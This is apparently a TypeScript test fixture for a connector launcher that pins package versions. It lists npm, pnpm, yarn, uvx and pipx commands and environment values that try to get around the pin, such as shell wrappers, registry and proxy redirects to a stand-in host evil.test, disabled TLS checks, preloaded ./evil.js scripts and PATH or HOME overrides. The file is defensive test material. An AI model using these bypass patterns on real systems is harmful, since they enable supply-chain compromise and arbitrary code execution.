import type { OverridingCommand } from "./connector-pin-overrides.ts";

/**
 * Pinned commands `app.package-runner-launch` refuses because the pin can't
 * be checked or the command runs something else: a shell, a program that
 * isn't a package runner, a runner's shell mode, an option that moves the
 * folder, config, trust or proxy, a package option whose command word
 * isn't the pinned package's, a command word that isn't the pinned package,
 * a package option after the command word, and an option a pinned runner
 * doesn't allow, such as npm's shortened `--reg`.
 */
export const bypassingCommands: readonly OverridingCommand[] = [
  // A shell can set a variable or write a config before the runner starts.
  {
    registry: "npm",
    command: "sh",
    args: ["-c", "NPM_CONFIG_REGISTRY=https://evil.test npx -y @acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "bash",
    args: ["-c", "npm config set registry https://evil.test; npx -y @acme/mail-mcp"],
  },
  { registry: "npm", command: "powershell", args: ["-Command", "node server.js"] },
  // A program that isn't a package runner can start one with anything.
  {
    registry: "npm",
    command: "env",
    args: ["NPM_CONFIG_REGISTRY=https://evil.test", "npx", "-y", "@acme/mail-mcp"],
  },
  { registry: "npm", command: "dash", args: ["-c", "npx -y @acme/mail-mcp"] },
  { registry: "npm", command: "wsl", args: ["npx", "-y", "@acme/mail-mcp"] },
  { registry: "npm", command: "node", args: ["evil.js"] },
  // A runner's shell mode runs a shell command.
  { registry: "npm", command: "npx", args: ["-p", "@acme/mail-mcp", "-c", "mail-mcp"] },
  {
    registry: "npm",
    command: "npm",
    args: ["exec", "--package=@acme/mail-mcp", "--call=mail-mcp"],
  },
  { registry: "npm", command: "pnpm", args: ["--shell-mode", "dlx", "@acme/mail-mcp"] },
  // Options that move the folder, config, trust or proxy the runner reads.
  { registry: "npm", command: "npx", args: ["--prefix", "./evil", "-y", "@acme/mail-mcp"] },
  { registry: "npm", command: "npx", args: ["-C", "./evil", "-y", "@acme/mail-mcp"] },
  {
    registry: "npm",
    command: "npx",
    args: ["--proxy", "http://evil.test:8080", "-y", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["--https-proxy=http://evil.test:8080", "-y", "@acme/mail-mcp"],
  },
  { registry: "npm", command: "npx", args: ["--cafile", "./evil-ca.pem", "-y", "@acme/mail-mcp"] },
  { registry: "npm", command: "npx", args: ["--strict-ssl=false", "-y", "@acme/mail-mcp"] },
  {
    registry: "npm",
    command: "npx",
    args: ["--node-options=--require=./evil.js", "-y", "@acme/mail-mcp"],
  },
  { registry: "npm", command: "pnpm", args: ["--dir=./evil", "dlx", "@acme/mail-mcp"] },
  {
    registry: "npm",
    command: "pnpm",
    args: ["--config.registry=https://evil.test", "dlx", "@acme/mail-mcp"],
  },
  { registry: "npm", command: "yarn", args: ["--cwd", "./evil", "dlx", "@acme/mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--directory", "./evil", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--project", "./evil", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--with-requirements", "./evil.txt", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--with-editable", "./evil", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["-c", "./evil.txt", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--allow-insecure-host", "evil.test", "mail-mcp"] },
  { registry: "pypi", command: "pipx", args: ["run", "--trusted-host", "evil.test", "mail-mcp"] },
  // A package option starts its command word, which must be the pinned package's.
  {
    registry: "npm",
    command: "npx",
    args: ["-y", "-p", "@acme/mail-mcp@2.3.1", "sh", "./evil.sh"],
  },
  { registry: "npm", command: "npx", args: ["--package=@acme/mail-mcp"] },
  {
    registry: "npm",
    command: "npm",
    args: ["exec", "--package", "@acme/mail-mcp", "--", "node", "evil.js"],
  },
  {
    registry: "pypi",
    command: "uvx",
    args: ["--from", "mail-mcp==2.3.1", "python", "./evil.py"],
  },
  { registry: "pypi", command: "uvx", args: ["--with", "mail-mcp", "other-tool"] },
  {
    registry: "pypi",
    command: "pipx",
    args: ["run", "--spec", "mail-mcp==2.3.1", "python", "./evil.py"],
  },
  // Without a package option, the command word is the package, which must be the pinned one.
  { registry: "npm", command: "npx", args: ["-y", "other-pkg", "@acme/mail-mcp"] },
  // A package option after the command word: `npm exec` reads it, `npx` and `uvx` pass it on.
  { registry: "npm", command: "npx", args: ["-y", "@acme/mail-mcp", "-p", "@acme/mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["mail-mcp", "--from", "mail-mcp"] },
  // npm reads a shortened long option, such as `--reg` for `--registry`, so only a few options pass.
  {
    registry: "npm",
    command: "npx",
    args: ["-y", "--reg=http://evil.test/", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["-y", "--regis=http://evil.test/", "@acme/mail-mcp"],
  },
  // `npm exec` also reads its own options after the command word, up to a `--`.
  {
    registry: "npm",
    command: "npm",
    args: ["exec", "@acme/mail-mcp", "--regis=http://evil.test/"],
  },
  { registry: "pypi", command: "pipx", args: ["run", "--ind=http://evil.test/", "mail-mcp"] },
];

/**
 * A connector `env` setting one variable that moves the config home or the
 * program lookup, in the case it is written, which
 * `app.package-runner-launch` refuses for a pinned connector.
 */
export const bypassingEnv: readonly Readonly<Record<string, string>>[] = [
  { HOME: "./evil-home" },
  { UserProfile: "./evil-home" },
  { APPDATA: "./evil-appdata" },
  { LOCALAPPDATA: "./evil-appdata" },
  { xdg_config_home: "./evil-config" },
  { XDG_CACHE_HOME: "./evil-cache" },
  { PATH: "./evil-bin" },
  { PATHEXT: ".EVIL" },
  { COMSPEC: "./evil.exe" },
];

/**
 * Pinned commands with a package option whose command word is the pinned
 * package's, which `app.package-runner-launch` lets through.
 */
export const packageOptionCommands: readonly OverridingCommand[] = [
  {
    registry: "npm",
    command: "npx",
    args: ["-y", "-p", "@acme/mail-mcp@2.3.1", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npm",
    args: ["--yes", "exec", "--package=@acme/mail-mcp@2.3.1", "--", "mail-mcp", "--inbox", "work"],
  },
  { registry: "pypi", command: "pipx", args: ["run", "--spec", "mail-mcp==2.3.1", "mail-mcp"] },
  // A package option without a version: the launcher adds the pin's, not the newest.
  {
    registry: "npm",
    command: "npm",
    args: ["exec", "--package=@acme/mail-mcp", "--", "mail-mcp"],
  },
  { registry: "npm", command: "npx", args: ["-y", "-p", "@acme/mail-mcp", "mail-mcp"] },
  { registry: "pypi", command: "uvx", args: ["--from", "mail-mcp", "mail-mcp"] },
  { registry: "pypi", command: "pipx", args: ["run", "--spec", "mail-mcp", "mail-mcp"] },
];
